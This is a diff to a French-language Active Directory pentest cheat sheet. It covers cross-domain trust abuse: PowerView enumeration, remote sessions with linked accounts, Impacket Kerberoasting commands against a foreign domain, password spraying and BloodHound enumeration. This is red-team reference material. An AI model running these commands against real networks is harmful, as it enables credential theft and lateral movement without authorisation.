@@ -19,3 +19,13 @@ Get-DomainForeignGroupMember -Domain <FOREIGN_DOM>
 Convert-SidToName <SID>
 -->Si le SID correspond aussi à un compte sur le domaine
 Enter-PSSession -ComputerName <MACHINE_CIBLE_FQDN> -Credential <compte lié sur domaine>
+
+#Depuis LINUX
+Enum SPN: GetUserSPNs.py -target-domain <FOREIGN_DOM> <DOM>/<USER>
+Request TGS: GetUserSPNs.py -request -target-domain <FOREIGN_DOM> <DOM>/<USER>
+--> Si nous n'avons aucune possibilités supplémentaires sur un domaine pour 
+escalader les privilèges. Tenter pass spray sur les comptes du FOREIGN DOM
+
+Enumérer avec bloodhound
+ne pas oublier de renseigner le domaine dans /etc/resolv.conf (FQDN et nameserver)
+Utiliser la fonction: Users w/ Foreign Domain Group Membership
